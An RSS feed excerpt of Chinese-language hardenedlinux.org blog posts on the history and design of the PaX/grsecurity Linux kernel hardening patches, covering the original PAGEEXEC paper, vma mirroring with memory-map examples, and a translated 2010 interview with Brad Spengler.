
   - 别信任你最喜欢的调试器，它仅能提供很少关于Windows NT/2000的分
     析子系统的信息。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;final-words&quot;&gt;6. final words&lt;/h3&gt;

&lt;p&gt;(to protect the innocent, names have been changed ;-)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   &amp;lt;innocent&amp;gt; well, buffer overflows will be gone in 2-3 years 
   &amp;lt;innocent&amp;gt; hopefully
   &amp;lt;pax&amp;gt; sooner ;-)
   &amp;lt;pax&amp;gt; a month at most
   &amp;lt;innocent&amp;gt; what ??
   &amp;lt;innocent&amp;gt; you bullshitting me now or what ?
   &amp;lt;pax&amp;gt; just sit back and watch ;-)
   &amp;lt;pax&amp;gt; sure i do
   &amp;lt;pax&amp;gt; no ;-)
   &amp;lt;innocent&amp;gt; ok
   &amp;lt;innocent&amp;gt; phew
   &amp;lt;innocent&amp;gt; argh
   &amp;lt;innocent&amp;gt; you got me there for a second ;&amp;gt;
   &amp;lt;pax&amp;gt; heh, why?
   &amp;lt;innocent&amp;gt; coz I was in panic that there was something big coming up
   &amp;lt;innocent&amp;gt; it is already getting harder to find overflows now
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;on a more serious note, the PaX team would like to thank acpizer, dezzy
   and halvar for their support, help and testing the Linux version.&lt;/p&gt;

&lt;h3 id=&quot;contact-information&quot;&gt;7. contact information&lt;/h3&gt;

&lt;p&gt;The PaX Team &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#097;&amp;#103;&amp;#101;&amp;#101;&amp;#120;&amp;#101;&amp;#099;&amp;#064;&amp;#102;&amp;#114;&amp;#101;&amp;#101;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#104;&amp;#117;&quot;&gt;&amp;#112;&amp;#097;&amp;#103;&amp;#101;&amp;#101;&amp;#120;&amp;#101;&amp;#099;&amp;#064;&amp;#102;&amp;#114;&amp;#101;&amp;#101;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#104;&amp;#117;&lt;/a&gt;
   PGP key fingerprint: D2E0 B4B6 16A3 B532 20B8  969B 956D 2366 39F0 81BF&lt;/p&gt;

&lt;p&gt;for participation in the Windows NT/2000 research/implementation contact
   Ice &amp;lt;white_ice@usa.net&amp;gt; or fOSSiL &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&quot;&gt;&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;history&quot;&gt;8. history&lt;/h3&gt;

&lt;p&gt;2000.08.06 初始文档
   2000.10.01 PaX的Linux实现诞生
   2000.10.22 修复一些小错误
   2000.10.27 增加COW场景
   2000.10.28 完成Linux实现的描述
   2000.11.05 修复处理VM_IO，IPC共享内存变成NOEXEC等问题
   2000.11.16 修复pd/pt访问竞争条件问题&lt;/p&gt;

&lt;h3 id=&quot;footnotes&quot;&gt;9. footnotes&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;http://www.plex86.org/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;depending on where this data originates from (local or a remote host),
we talk about local and remote exploits, although the underlying problem
remains the same.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;http://www.plex86.org/news.phtml?id=3&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;we found it somewhat unfortunate how VM_STACK_FLAGS was defined. first,
its definition was not based on the existing symbolic constants but had
the raw hexadecimal value (so a simple ‘grep’ for ‘interesting’ symbols
would miss it whereas it is of crucial importance for determining the
protection flags for stack pages). second, its value included execution
permission which is of course exactly what we want to avoid. our patch
fixes at least the latter issue (holy lazyness ;-).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;for PPro+ processors when CR4.PSE is enabled the error code may also
indicate whether the fault occured due to some reserved bits in the
paging structures not being 0. in Linux (2.2.x at least) this can never
happen, hence its omission.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;see links at http://www.sandpile.org/ in the ‘impl’ section&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

</description>
        <pubDate>Mon, 25 May 2015 10:08:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/05/25/pageexec-old.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/05/25/pageexec-old.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>PaX的技术考古之旅</title>
        <description>&lt;p&gt;h4rdenedzer0会尝试翻译PaX/Grsecurity的一些文档，请关注。&lt;/p&gt;

&lt;h2 id=&quot;grsecuritypax&quot;&gt;0. 什么是Grsecurity/PaX?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://pax.grsecurity.net/&quot;&gt;PaX&lt;/a&gt;是针对linux kernel的一个加固版本的补丁，它让linux内核的内存页受限于
最小权限原则，是这个星球上有史以来最极端和最优秀的防御系统级别0day的方
案，第1版的设计和实现诞生于2000年，那可是一个没有
ASLR/RELRO/NX/CANARY/FORITY/PIE都没有的年代，这些今天意义上的现代
mitigation技术不管是linux/windows/macosx都多少抄袭和模仿了PaX的设计和实
现，但有很多朋友会问：既然这东东这么厉害，为什么不在linux mainline里？
PaX没有进入Linux内核upstream的原因不止一个，甚至有时候都不是纯粹技术本身的问题：&lt;/p&gt;

&lt;p&gt;1) &lt;a href=&quot;http://unix.stackexchange.com/questions/59020/why-are-the-grsecurity-patches-not-included-in-the-vanilla-kernel&quot;&gt;PaX Team并不在意PaX是否进入Linux主干代码&lt;/a&gt;，但多年来有很多关心Linux内核安全的人不断的尝试把PaX的代码分拆成小的patch提交给Linux内核社区。&lt;/p&gt;

&lt;p&gt;2) Linux内核社区认为PaX的代码难以维护，而Linux内核社区更喜欢花时间在性能和新功能上，而非安全。&lt;/p&gt;

&lt;p&gt;3) Linux内核社区和Linux基金会受到由各个大厂商的影响，大厂商对于安全的要求取决于他们的客户的需求，如果很多真相不曝光大厂商是不会在意安全性的&lt;/p&gt;

&lt;p&gt;4) 商业公司在意他们的主要利润来源，比如Five-eyes国家（美国，英国，加拿大，澳大利亚和新西兰）的政府项目都会统一采购SELinux的项目，所以大厂商都会花费精力去满足这一需求，这也是SELinux虽然备受争议但是一直有厂商和NSA持续投入的原因。&lt;/p&gt;

&lt;p&gt;SELinux也是一个著名的开源MAC（强制访问控制）实现，是由NSA(美国国家安全局）于1990年代末发起的项目，于2000年以GPL自由软件许可证开放源代码，2003年&lt;a href=&quot;http://www.internetnews.com/ent-news/article.php/3317331&quot;&gt;合并到Linux内核中&lt;/a&gt;，过去10年中关于&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;是否NSA在其中放后门的争论&lt;/a&gt;没有停过，一些人认为应该信任SELinux，因为它是以GPL自由软件许可证公开的源代码，也有人认为它是NSA参与过的项目，所以不应该信任。2013年Snowden曝光棱镜后更多的人极度的不信任NSA，认为&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA有对Android代码植入后门的前科&lt;/a&gt;，所以应该&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;怀疑所有NSA积极参与的项目包括SELinux&lt;/a&gt;。目前MAC的开源实现里，SELinux主要由RedHat/CentOS/Fedora社区维护，Apparmor主要由OpenSuSE/Ubuntu社区维护，关于SELinux是否应该使用是一个长久争论的话题，个人认为这取决于你的威胁建模，如果你是Five-Eyes阵营你当然应该使用SELinux，如果你是其他阵营比如德国或者中国，或许你应该考虑其他选择。&lt;/p&gt;

&lt;p&gt;针对Linux内核的MAC实现都是基于LSM( Linux Security Module)去实现的，LSM利用了一堆CAPABILITY的
机制提供了一些限制用户态程序访问控制的接口，SELinux和Apparmor都是基于LSM开发的，注意LSM并不是一个传统意义上的linux kernel module，至少在2个地方不同于普通module:&lt;/p&gt;

&lt;p&gt;1) 必须在bootloader启动内核时启动，不能在内核加载完后启动。&lt;/p&gt;

&lt;p&gt;2) 不能同时启动2个LSM的实现。&lt;/p&gt;

&lt;p&gt;但PaX Team是一群old school security hackers，他们认为LSM一方面打破了
“security as a whole”的哲学，另外一方面对于&lt;a href=&quot;https://grsecurity.net/compare.php&quot;&gt;内核漏洞没有防御能力&lt;/a&gt;，虽然在早年Linux内核社区以及大厂商不管是刻意还是无意的想要掩盖这一点，但&lt;a href=&quot;https://grsecurity.net/spender_summit.pdf&quot;&gt;时间&lt;/a&gt;证明PaX Team是正确的。其
实当人们谈到Gnu/Linux安全性比windows/OSX更好时，其实未必，至少linux内核社区并没有把安全性放在首位，Linus Torvalds从来都不是太care安全问题，不是吗？&lt;/p&gt;

&lt;p&gt;PaX从一开始就主要关注如何防御和检测memory corruption，PaX由PaX team维护，Grsecurity主要包括了RBAC（基于角色的访问控制）和一系列对PaX的改进，Grsecurity主要由Spender维护，最近几年这2组Patch都合并到了一起发布，所以我们都称这组补丁为Grsecurity/PaX或者PaX/Grsecurity。&lt;/p&gt;

&lt;h2 id=&quot;pax&quot;&gt;0.1 PaX的诞生&lt;/h2&gt;

&lt;p&gt;这个section描述的是这篇“过时”的&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;论文&lt;/a&gt;，这是PaX的Genesis，1999年7月的
&lt;a href=&quot;http://www.plex86.org/&quot;&gt;plex86社区&lt;/a&gt;(old school虚拟化社区之一)打算验证一个概念，当时Pentium(包
括P6family)处理器新增加了一个功能，就是CPU把TLB区分为DTLB(数据TLB)和
ITLB(指令TLB)，TLB主要是PTE( page table entries)的缓存，因此存放着
user/kernel spaces的访问权限信息，在正常的情况下，ITLB和DTLB entries从
相同的PTE里读出相同的状态，但如果状态有所改变的话也就意味着可以把数据读
写和代码执行分开，如果这个POC能成功也就意味着可以对抗缓冲区溢出的最佳方
案，这个成为了今天的NX=&amp;gt;要么可读写要么可执行。&lt;/p&gt;

&lt;p&gt;在PaX的初始设计文档中经过了对PTE中的2个flags的分析：&lt;/p&gt;

&lt;p&gt;Present位，如果设置1，指向的page(或者page table)是存在于内存里的；如果
设置为0，page没有在内存里和保存的入口位(bits)可能会被OS用作其他用途。如
果page table或者page directory的入口需要执行地址转换(线性地址到物理地
址)时Present位被清0，会产生一个异常:page fault异常。&lt;/p&gt;

&lt;p&gt;U/S位，权限管理，U-&amp;gt;user space, S-&amp;gt;kernel space&lt;/p&gt;

&lt;p&gt;关于ITLB和DTLB的状态之间的转换这篇paper里已经有非常详细的描述，这里就不
多阐述了，linux内核的实现问题，虚拟内存管理的主要结构是vm_area_struct，
主要是描述连续的线性地址的一些属性包括
READ/WRITE/EXECUTE/SHARED/PRIVATE等，里面有2个结构体成员需要关注：
vm_flags，vm_page_prot。PaX在出现page fault的时候多增加了一些动作包括模
拟page table entry里的可访问U标志位和在模拟PTE中检查访问权限。&lt;/p&gt;

&lt;p&gt;PaX的第一版的副作用也不小，
1，用户态可执行的栈是不可能的
2，性能损耗在5%–8%&lt;/p&gt;

&lt;p&gt;old school社区plex86在1999年的一个概念验证建立了后来NX(目前是硬件支持)
的基础，个人觉得最有意思的地方是防御缓冲区溢出利用最早的策略是基于对于
TLB的研究导致的，这听起来怎么那么像emerging property, Out of C0ntrol?
KK? Ring the bell?&lt;/p&gt;

&lt;h2 id=&quot;pax-1&quot;&gt;1. 2003年PaX谈”未来”&lt;/h2&gt;

&lt;p&gt;PaX在2003年的时候开始思考如何在[未来&lt;a href=&quot;https://pax.grsecurity.net/docs/pax-future.txt&quot;&gt;(2003以后)在根本上根除漏洞利用&lt;/a&gt;，PaX
对于W-xor-X的实现非常奏效，具体在&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;PAGEEXEC原始设计文档&lt;/a&gt;里已经有所描述。&lt;/p&gt;

&lt;p&gt;从defensive的平面来看，当时GNU/Linux平台主要依赖PaX的patch来进行加固(包
括ASLR)，ASLR和NX进入linux内核mainstream是后来的事情，OpenBSD和Windows
XP SP2和OSX 10.5也加入了NX，但都是抄袭PaX的设计(或许也包括实现)，&lt;/p&gt;

&lt;p&gt;从offensive的平面来看，2003年的背景是stack-based overflow和string
format vuln已经泛滥，但ROP还没有大规模的流行，但old school社区对于ROP的
研究已经有相当的研究，包括Solar Designer在1997年发到&lt;a href=&quot;http://seclists.org/bugtraq/1997/Aug/63&quot;&gt;bugtraq里的讨论&lt;/a&gt;，之后更精彩的paper是在2001年&lt;a href=&quot;http://phrack.org/archives/issues/58/4.txt&quot;&gt;Phrack Issue 58的那篇论文”The advanced return-into-lib(c) exploits: PaX case study”&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;注意：2003年时SK的那篇Borrowed code chunks还没有发布。&lt;/p&gt;

&lt;p&gt;2003年，PaX team认为会导致漏洞利用的bug给予了攻击者(区分攻击者和黑客是
不同的term)在3个不同层面上访问被攻击的进程：&lt;/p&gt;

&lt;p&gt;(1) 执行任意代码
(2) 执行现有代码但打破了原有的执行顺序
(3) 原有的执行顺序执行现有代码，但加载任意数据&lt;/p&gt;

&lt;p&gt;NOEXEC( Non-executable pages)和MPROTECT(mmap/mprotect)能防御(1)，但有一
种情况是例外：如果攻击者能创建和写入一个文件然后mmap()到被攻击的进程空
间里，这样可以执行任意的代码。&lt;/p&gt;

&lt;p&gt;ASLR在一定程度上降低了(1),(2),(3)的风险，但如果内核有信息泄露的bug例外。
PaX team在当时就认为把内核当成可信计算( Trusted Computing)的基础是一件
可笑的事情，因为内核跟用户空间一样容易遭受各种攻击。所以他们认为”未来”
需要做一些事情(注：这些事情今天都已经搞定）：&lt;/p&gt;

&lt;p&gt;(a) 尝试处理(1)不能处理的那个例外情况
(b) 实现所有可能在内核态自己的防御机制
(c) 为(2)实现确定性( deterministic)防护，可能也为(3)实现类似的机制
(d) 为(2)实现概率行( probalilistic)防护以实现阻止信息泄露&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;处理(a)更好的解决方案是使用访问控制和可信路径执行来限制，Grsecurity今
天就是这么做的
—————————————————&lt;/p&gt;

&lt;p&gt;之后这篇文档里详细的罗列了针对(a)(b)(c)(d)需要去实现的加固方案。在&lt;a href=&quot;https://raw.githubusercontent.com/citypw/security-regression-testing-for-suse/master/other/vulns_hardening_assessment.log&quot;&gt;这里已经能看出一些后来出现的mitigation技术&lt;/a&gt;：Stack Canary, RELRO,
pointer constant/encryption?&lt;/p&gt;

&lt;h2 id=&quot;paxvma-mirroring&quot;&gt;1.1 2003年PaX里vma mirroring的设计&lt;/h2&gt;

&lt;p&gt;在2003年的晚些时候PaX实现了&lt;a href=&quot;https://pax.grsecurity.net/docs/vmmirror.txt&quot;&gt;虚拟内存空间的镜像( vma mirroring)&lt;/a&gt;，vma
mirroring的目的是为了在一组物理页上做特殊文件隐射时有2个不同的线性地址，
这2个地址即使在swap-out/swap-in或者COW后依然是不会改变的。这样做的目的
为了满足几种场景：&lt;/p&gt;

&lt;p&gt;1，把可执行的区域在使用SEGMEXEC隐射进入代码段。在32-bit的linux内核里的
4GB地址空间是其中3GB给用户空间，1GB给内核空间，而vma mirroring把用户空
间的3GB划分成了2个1.5GB分别是给代码段和数据段，在可执行区域里包含的数据
的部分(常量字符串，函数指针表等)都会mirroring到数据段里。&lt;/p&gt;

&lt;p&gt;2，实现可执行区域的地址随机化( RANDEXEC)。&lt;/p&gt;

&lt;p&gt;3，这个引出了第3种情况，就是SEGMEXEC和RANDEXEC同时激活，个人觉得这个的
效果应该和PIE＋ASLR的效果类似，不同的不是整个elf binary的代码段随机化，
而是在mirroring时对代码段和数据段进行随机化。&lt;/p&gt;

&lt;p&gt;之后这篇文章开始聊到实现的问题，对于一个普通的用户态binary在执行后，内
核得做一系列的工作，fs/binfmt_elf.c里的load_elf_binary()负责进程地址空
间的一些基本的映射包括stack,动态连接器和binary本身。而文件的映射是通过
elf_map()调用do_mmap()完成的。用户态binary的第1条指令从ld.so或者binary
自己fetch到后会raise一个page fault，linux内核内存管理是按需分配内存的，
所以在binary刚执行时是没有建立有效的物理映射的。x86架构的page fault
handler在arch/i386/mm/fault.c文件里的do_page_fault()去找到vma结构体，
VMA里包含了物理页的数据(ELF文件里的代码段, etc)。&lt;/p&gt;

&lt;p&gt;当时的PaX的做法大致是这样的，vma mirror是根据已经内存映射mmap()后的地址，
用户态通过mmap()是无法直接去做vma mirror请求的，所有的mmap()请求多会经
过include/linux/mm.h的do_map()，PaX扩展( SEGMEXEC)也是在这个地方处理，
原始内核通过调用do_mmap_pgoff()来调用do_mmap()，PaX在这里为了确保
SEGMEXEC能知道来自用户态和内核态的原生文件映射请求所以略过
do_mmap_pgoff()而直接调用do_mmap()，而vma mirror请求使用一些特殊参数传
递给do_mmap_pgoff():&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;'file'    必须是NULL，因为mirror会引用相同文件的vma作为镜像
'addr'    正常使用
'len'    必须是0
‘prot'    正常使用
'flags'    正常使用，除了一种情况：指定MAP_MIRROR和只能指定private映射
'pgoff'    指定vma的线性起始地址作为镜像
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;文章给出了一个例子：&lt;/p&gt;

&lt;p&gt;# cp /bin/cat /tmp/
# /tmp/cat /proc/self/maps&lt;/p&gt;

&lt;p&gt;激活PaX的2个功能: SEGMEXEC, MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R-Xp 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
[3] 0804b000-0804d000 RW-p 00000000 00:00 0
[4] 20000000-20015000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
[5] 20015000-20016000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
[6] 2001e000-20143000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
[7] 20143000-20149000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
[8] 20149000-2014d000 RW-p 00000000 00:00 0
[9] 5fffe000-60000000 RW-p fffff000 00:00 0    [10] 68048000-6804a000 R-Xp 00000000 00:0b 1109       /tmp/cat    [11] 80000000-80015000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so    [12] 8001e000-80143000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个binary是一个动态连接的可执行程序，所以在执行时会映射其他的库文件。&lt;/p&gt;

&lt;p&gt;[1] 这个binary文件/tmp/cat的第1个PT-LOAD段映射为有读和执行的权限，包含
了可执行的代码和只读的初始化后的数据。因为是可执行的所以被[10]镜像。&lt;/p&gt;

&lt;p&gt;[2] 第2个PT_LOAD段，映射为读写权限，包含了可写的数据(所有初始化和没有初
始化的)&lt;/p&gt;

&lt;p&gt;[3] brk()管理的堆，在运行时会根据malloc()/free()来调整大小&lt;/p&gt;

&lt;p&gt;[4][5] 动态连接器&lt;/p&gt;

&lt;p&gt;[6][7] C库 ，[4][6]被映射到了[11][12]，因为他们是可执行的。&lt;/p&gt;

&lt;p&gt;[8] 一个针对C库的初始化数据的匿名映射&lt;/p&gt;

&lt;p&gt;[9] 一个匿名映射包含了stack。我们能观察到这个地址在用户空间的数据部分的
结束地址，开启SEGMEXEC后是TASK_SIZE/2。&lt;/p&gt;

&lt;p&gt;[10][11][12] 分别映射可执行镜像[1][4][6]。&lt;/p&gt;

&lt;p&gt;激活PaX的3个功能的情况: SEGMEXEC，RANDEXEC，MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R-Xp 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
    0804b000-0804d000 RW-p 00000000 00:00 0
[3] 20000000-20002000 ++-p 00000000 00:00 0
[4] 20002000-20003000 RW-p 00002000 00:0b 1109       /tmp/cat
    20003000-20018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    20018000-20019000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
    20021000-20146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
    20146000-2014c000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
    2014c000-20150000 RW-p 00000000 00:00 0
[5] 5fffe000-60000000 RW-p 00000000 00:00 0
[6] 80000000-80002000 R-Xp 00000000 00:0b 1109       /tmp/cat
    80003000-80018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    80021000-80146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;RANDEXEC有一些改变，[3]成了第1个可执行的PT_LOAD段的匿名映射，[4]成为第
2个PT_LOAD段的的mirror，[2]和[4]有相同的页偏移值，文档说[1]被[6]给
mirror后是超出了TASK/SIZE/2的范围，但个人觉得这个地方是代码段的区域所以
必然是在1.5G以上(如果数据段在0-1.5G的话)，还有就是在RANDUSTACK开启后由
于stack的第1部分不能关闭随机化，所以多比第1个例子多占了1个page，这个怎
么得出的呢？靠我真不知道，可能是fffff000 xor ffffffff = fff来的？&lt;/p&gt;

&lt;p&gt;激活PaX的3个功能的情况: PAGEEXEC, RANDEXEC, MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R--p 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
    0804b000-0804d000 RW-p 00000000 00:00 0
[3] 40000000-40002000 R-Xp 00000000 00:0b 1109       /tmp/cat
[4] 40002000-40003000 RW-p 00002000 00:0b 1109       /tmp/cat
    40003000-40018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    40018000-40019000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
    40021000-40146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
    40146000-4014c000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
    4014c000-40150000 RW-p 00000000 00:00 0
    bfffe000-c0000000 RW-p fffff000 00:00 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后的这种情况是vma mirroring所产生最简单的内存layout，只有binary本生被
镜像了，[1]被[3]，[2]被[4]镜像了。注意[1]没有R-X权限了，在PAGEEXEC下只
有R–。&lt;/p&gt;

&lt;p&gt;虽然现在的PaX实现肯定不是这个设计的版本，但读读原始的paper会有一些意想
不到的收获，也算技术进化考古的过程了;-)&lt;/p&gt;

&lt;h2 id=&quot;ld-sch00l&quot;&gt;2. 0ld sch00l黑客的出埃及记&lt;/h2&gt;

&lt;p&gt;Grsecurity/PaX目前&lt;a href=&quot;https://grsecurity.net/the_case_for_grsecurity.pdf&quot;&gt;应用广泛&lt;/a&gt;，特别是具有高安全性的环境，Gnu/Linux发行版里
Gentoo提供PaX作为加固选项，最近半年Debian社区发起的对抗大规模监控的加固
项目&lt;a href=&quot;http://mempo.org/&quot;&gt;Mempo&lt;/a&gt;在内核中也使用了Grsecurity/PaX。&lt;/p&gt;

&lt;p&gt;这篇文章仅仅是在学习PaX的3篇paper里的记录，PaX的思路的确非常的震撼，那
都是10多年前的设计和实现，在这个一天云计算一天雾计算的年代，虽然关注本
质的黑客越来越少，但地下精神并未死去，PaX Team就是一个活生生的例证，相
反，不少old school黑客都坚信其实old school的数量并没有减少，至少我个人
相信这是真的…Phrack没死，Grsecurity/PaX没死，DNFWAH也没死，希望更多的
黑客分享自己的hacking之旅。&lt;/p&gt;

&lt;p&gt;Phrack is not dead, Grsecurity/PaX is not dead, DNFWAH is not dead,
The Underground spirit is not dead…..If they were, that’d be on us!&lt;/p&gt;

&lt;p&gt;=——————————————————————–=&lt;/p&gt;

&lt;p&gt;To one of the most respected old school communities:
Grsecurity/PaX. We/I salute you!!!&lt;/p&gt;

</description>
        <pubDate>Sun, 24 May 2015 03:20:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/jekyll/update/2015/05/24/archeological_hacking_on_pax.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/jekyll/update/2015/05/24/archeological_hacking_on_pax.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Brad Spengler( Pax Team/grsecurity)访谈, 2010年1月1日</title>
        <description>&lt;h2 id=&quot;brad-spengler-pax-teamgrsecurity-interview-jan-1-2010httpsslo-techcomclanki10001en&quot;&gt;原文：&lt;a href=&quot;https://slo-tech.com/clanki/10001en&quot;&gt;Brad Spengler (PaX Team/grsecurity) interview， Jan 1 2010&lt;/a&gt;&lt;/h2&gt;

&lt;h2 id=&quot;shawn-the-r0ck-may-16-2015&quot;&gt;译者：Shawn the R0ck, May 16 2015&lt;/h2&gt;

&lt;p&gt;Shawn：PaX/Grsecurity是在OS安全上的一个开创性的贡献，没有
PaX/Grsecurity的GNU/Linux的安全性只能防御脚本小子，过去的14年里
Pax/Grsecurity为Linux内核做出了巨大出贡献的贡献，但到今天Linux内核社区
都不愿意承认，这可能的确是受商业厂商控制了主流媒体的后果，&lt;a href=&quot;https://raw.githubusercontent.com/citypw/DNFWAH/master/3/d3_0x06_hacker_nsa_free-software.txt&quot;&gt;在后棱镜时代&lt;/a&gt;，
这种现象有极端的阴谋论甚至认为NSA也是推手，当然这也并非完全没有道理，毕
竟&lt;a href=&quot;http://www.solidot.org/story?sid=43483&quot;&gt;SELinux项目&lt;/a&gt;早已成为Five-Eyes国家的标配。&lt;/p&gt;

&lt;p&gt;我尝试翻译这篇5年前的访谈是为了让更多的人了解到历史，因为反观今天的
Linux内核社区对于安全的态度相比5年前可能是更糟糕，&lt;a href=&quot;http://www.solidot.org/story?sid=42174&quot;&gt;offset2lib&lt;/a&gt;的远程利用
方式轻松绕过了GNU/Linux厂商们宣称的完美防御，相信就算是智商只有85的人也
能明白“抗爆破”机制只能抗不到1秒的时间是在扯淡;-) 即使offset2lib所带来的
风险巨大，Linux内核社区的态度也是极度傲慢，他们也不认为这个
PaX/Grsecurity在2001年就已经加固的攻击平面而他们在2015年还存在有什么问
题，而BadiRET漏洞里我们更能清晰的看到SMEP虽然被绕过，但SMAP依然有效，而这两个Intel CPU的特性也是源于2007年PaX/Grsecurity的其中一个特性UDEREF的启发，自从有了OS的攻防历史，就有了PaX/Grsecurity，如果Linux内核社区继续傲慢自大，最终的受害者是企业用户和个人用户。&lt;/p&gt;

&lt;p&gt;在Anarchist看来，这样的Linux内核社区正是数字军火商，斯拉夫兵工厂甚至
NSA所喜欢的。&lt;/p&gt;

&lt;h2 id=&quot;brad-spengler-pax-teamgrsecurity&quot;&gt;标题：Brad Spengler( PaX Team/grsecurity)访谈&lt;/h2&gt;

&lt;h3 id=&quot;slo-techspenderspengler--brad&quot;&gt;Slo-Tech：向我们的读者介绍一下你自己（工作，教育背景以及兴趣），也请你解释一下你的真名是Spender还是Spengler;-) 请问Brad是否是任何黑帽组织的成员？&lt;/h3&gt;

&lt;p&gt;Brad Spengler: Brad Spengler(不是Brad Spender)，虽然相似的名字并非偶然，
我改了改姓氏作为别名。我毕业于Bucknell大学，获得了计算机与工程（混杂了
计算机科学和电子硬件的课程）学士学位和一个应用数学的学士学位。数学/物理
学/经济学/哲学都是我最有兴趣的课程。我在学习操作系统课程之前就已经有4年
的学习Linux内核和编程的经历，所以计算机科学课程并不是那么的有趣。我从来
没有参加过任何黑帽组织。自从高中开始我总是对创造有趣的事物有兴趣。&lt;/p&gt;

&lt;p&gt;………………….(未翻译）&lt;/p&gt;

&lt;h3 id=&quot;slo-techpaxgrsecurity&quot;&gt;Slo-Tech：你能用简单描述一下什么是PaX和GRSecurity以及有多少人参与这些项目吗？&lt;/h3&gt;

&lt;p&gt;Brad Spengler：&lt;a href=&quot;http://en.wikipedia.org/wiki/PaX&quot;&gt;PaX&lt;/a&gt;是一头戏剧性的改变了整个安全的形态的野兽，而且对未来
安全的影响甚至会更多。PaX专注于一次性的解决一堆各种类型的漏洞利用，有一
些工作还没有完成，但希望能有所改变，也希望8年后（Shawn：现在已经是5年后
了，愚蠢的大众还是宁愿相信商业厂商和NSA;-)）所有人都能明白PaX的前瞻性。
PaX完全专注于内存的漏洞利用，&lt;a href=&quot;http://www.grsecurity.net/&quot;&gt;grsecurity&lt;/a&gt;则增加了主机层的防御和基于现有的
PaX特性进行了一系列的改进，包括抗爆破，ASLR的抗信息泄漏，不允许文件系统
级别的任意代码执行等。Grsecurity包括了很多简单的自动化特性，比如RBAC系
统可以通过学习模式（你可以选择基于进程/用户或者整个系统）来自动化创建规
则，这些规则都是人类可读的纯文本格式（Shawn：SELinux是使用难以审计的二
进制的格式。），报错信息有助于根据攻击类型来制定相应的规则。&lt;/p&gt;

&lt;p&gt;PaX项目的参与人数是未知的！因此PaX Team至少有一个人:) 对于grsecurity这
边就我一个人。偶尔我也收到一些patch提交（比如来自Zbyniu Krzystolik），
赞助者和朋友有时也会告诉我他们想要加入一些新功能。&lt;/p&gt;

